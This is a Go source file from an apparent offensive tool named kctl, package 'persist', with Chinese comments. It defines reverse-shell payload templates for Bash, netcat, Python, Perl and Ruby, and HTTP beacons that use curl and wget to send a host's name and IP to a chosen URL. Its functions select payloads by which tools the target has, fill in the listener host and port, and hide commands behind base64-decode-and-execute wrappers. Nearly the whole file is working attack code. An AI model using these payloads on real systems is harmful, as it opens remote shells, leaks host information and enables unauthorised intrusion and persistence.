package persist

import (
	"encoding/base64"
	"fmt"
	"strings"

	"kctl/pkg/types"
)

// PayloadTemplates 预定义的载荷模板
var PayloadTemplates = []types.PayloadTemplate{
	// Reverse Shell - Bash
	{
		Type:          types.PayloadReverseShellBash,
		Name:          "Reverse Shell (Bash)",
		Description:   "使用 Bash 的反向 Shell",
		Template:      "bash -i >& /dev/tcp/{Host}/{Port} 0>&1",
		RequiredTools: []string{"bash"},
		Parameters: []types.PayloadParameter{
			{Name: "Host", Description: "监听主机 IP", Required: true},
			{Name: "Port", Description: "监听端口", Default: "4444", Required: true},
		},
	},
	// Reverse Shell - NC with -e
	{
		Type:          types.PayloadReverseShellNC,
		Name:          "Reverse Shell (NC -e)",
		Description:   "使用 nc -e 的反向 Shell",
		Template:      "nc {Host} {Port} -e /bin/sh",
		RequiredTools: []string{"nc", "sh"},
		Parameters: []types.PayloadParameter{
			{Name: "Host", Description: "监听主机 IP", Required: true},
			{Name: "Port", Description: "监听端口", Default: "4444", Required: true},
		},
	},
	// Reverse Shell - NC Pipe (更通用)
	{
		Type:          types.PayloadReverseShellNCPipe,
		Name:          "Reverse Shell (NC Pipe)",
		Description:   "使用 nc 管道的反向 Shell (兼容性更好)",
		Template:      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {Host} {Port} >/tmp/f",
		RequiredTools: []string{"nc", "sh"},
		Parameters: []types.PayloadParameter{
			{Name: "Host", Description: "监听主机 IP", Required: true},
			{Name: "Port", Description: "监听端口", Default: "4444", Required: true},
		},
	},
	// Reverse Shell - Python
	{
		Type:          types.PayloadReverseShellPython,
		Name:          "Reverse Shell (Python)",
		Description:   "使用 Python 的反向 Shell",
		Template:      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{Host}",{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
		RequiredTools: []string{"python3", "sh"},
		Parameters: []types.PayloadParameter{
			{Name: "Host", Description: "监听主机 IP", Required: true},
			{Name: "Port", Description: "监听端口", Default: "4444", Required: true},
		},
	},
	// Reverse Shell - Perl
	{
		Type:          types.PayloadReverseShellPerl,
		Name:          "Reverse Shell (Perl)",
		Description:   "使用 Perl 的反向 Shell",
		Template:      `perl -e 'use Socket;$i="{Host}";$p={Port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
		RequiredTools: []string{"perl", "sh"},
		Parameters: []types.PayloadParameter{
			{Name: "Host", Description: "监听主机 IP", Required: true},
			{Name: "Port", Description: "监听端口", Default: "4444", Required: true},
		},
	},
	// Reverse Shell - Ruby
	{
		Type:          types.PayloadReverseShellRuby,
		Name:          "Reverse Shell (Ruby)",
		Description:   "使用 Ruby 的反向 Shell",
		Template:      `ruby -rsocket -e'f=TCPSocket.open("{Host}",{Port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
		RequiredTools: []string{"ruby", "sh"},
		Parameters: []types.PayloadParameter{
			{Name: "Host", Description: "监听主机 IP", Required: true},
			{Name: "Port", Description: "监听端口", Default: "4444", Required: true},
		},
	},
	// HTTP Beacon - Curl
	{
		Type:          types.PayloadHTTPBeaconCurl,
		Name:          "HTTP Beacon (Curl)",
		Description:   "使用 curl 发送 HTTP 信标",
		Template:      "curl -s {URL} -d \"host=$(hostname)&ip=$(hostname -i 2>/dev/null || echo unknown)\"",
		RequiredTools: []string{"curl"},
		Parameters: []types.PayloadParameter{
			{Name: "URL", Description: "信标接收 URL", Required: true},
		},
	},
	// HTTP Beacon - Wget
	{
		Type:          types.PayloadHTTPBeaconWget,
		Name:          "HTTP Beacon (Wget)",
		Description:   "使用 wget 发送 HTTP 信标",
		Template:      "wget -q -O- --post-data=\"host=$(hostname)&ip=$(hostname -i 2>/dev/null || echo unknown)\" {URL}",
		RequiredTools: []string{"wget"},
		Parameters: []types.PayloadParameter{
			{Name: "URL", Description: "信标接收 URL", Required: true},
		},
	},
	// Custom Command
	{
		Type:          types.PayloadCustom,
		Name:          "Custom Command",
		Description:   "自定义命令",
		Template:      "{Command}",
		RequiredTools: []string{},
		Parameters: []types.PayloadParameter{
			{Name: "Command", Description: "要执行的命令", Required: true},
		},
	},
}

// GetPayloadTemplate 根据类型获取载荷模板
func GetPayloadTemplate(payloadType types.PayloadType) *types.PayloadTemplate {
	for i := range PayloadTemplates {
		if PayloadTemplates[i].Type == payloadType {
			return &PayloadTemplates[i]
		}
	}
	return nil
}

// GetAvailablePayloads 根据可用工具获取可用的载荷列表
func GetAvailablePayloads(toolResults []types.ToolDetectionResult) []types.PayloadTemplate {
	var available []types.PayloadTemplate

	for _, template := range PayloadTemplates {
		// Custom 总是可用
		if template.Type == types.PayloadCustom {
			available = append(available, template)
			continue
		}

		// 检查所需工具是否都可用
		allAvailable := true
		for _, tool := range template.RequiredTools {
			if !HasTool(toolResults, tool) {
				allAvailable = false
				break
			}
		}

		if allAvailable {
			available = append(available, template)
		}
	}

	return available
}

// BuildPayload 根据模板和参数构建载荷
func BuildPayload(template *types.PayloadTemplate, params map[string]string) (string, error) {
	if template == nil {
		return "", fmt.Errorf("模板不能为空")
	}

	// 验证必需参数
	for _, param := range template.Parameters {
		if param.Required {
			value, ok := params[param.Name]
			if !ok || value == "" {
				// 尝试使用默认值
				if param.Default != "" {
					params[param.Name] = param.Default
				} else {
					return "", fmt.Errorf("缺少必需参数: %s", param.Name)
				}
			}
		}
	}

	// 替换模板中的占位符
	result := template.Template
	for name, value := range params {
		placeholder := "{" + name + "}"
		result = strings.ReplaceAll(result, placeholder, value)
	}

	return result, nil
}

// EncodePayload 对载荷进行 Base64 编码并包装
// 格式: (echo 'BASE64'|base64 -d|sh)||true
func EncodePayload(payload string, shell string) string {
	if shell == "" {
		shell = "sh"
	}

	encoded := base64.StdEncoding.EncodeToString([]byte(payload))
	return fmt.Sprintf("(echo '%s'|base64 -d|%s)||true", encoded, shell)
}

// DecodePayload 解码 Base64 编码的载荷
func DecodePayload(encoded string) (string, error) {
	// 提取 Base64 部分
	// 格式: (echo 'BASE64'|base64 -d|sh)||true
	start := strings.Index(encoded, "'")
	end := strings.LastIndex(encoded, "'")
	if start == -1 || end == -1 || start >= end {
		return "", fmt.Errorf("无效的编码格式")
	}

	b64 := encoded[start+1 : end]
	decoded, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return "", fmt.Errorf("Base64 解码失败: %w", err)
	}

	return string(decoded), nil
}

// FormatPayloadList 格式化载荷列表
func FormatPayloadList(payloads []types.PayloadTemplate) string {
	var sb strings.Builder
	sb.WriteString("可用载荷:\n")

	for i, p := range payloads {
		sb.WriteString(fmt.Sprintf("  %d. %s\n", i+1, p.Name))
		sb.WriteString(fmt.Sprintf("     %s\n", p.Description))
		if len(p.RequiredTools) > 0 {
			sb.WriteString(fmt.Sprintf("     需要: %s\n", strings.Join(p.RequiredTools, ", ")))
		}
	}

	return sb.String()
}
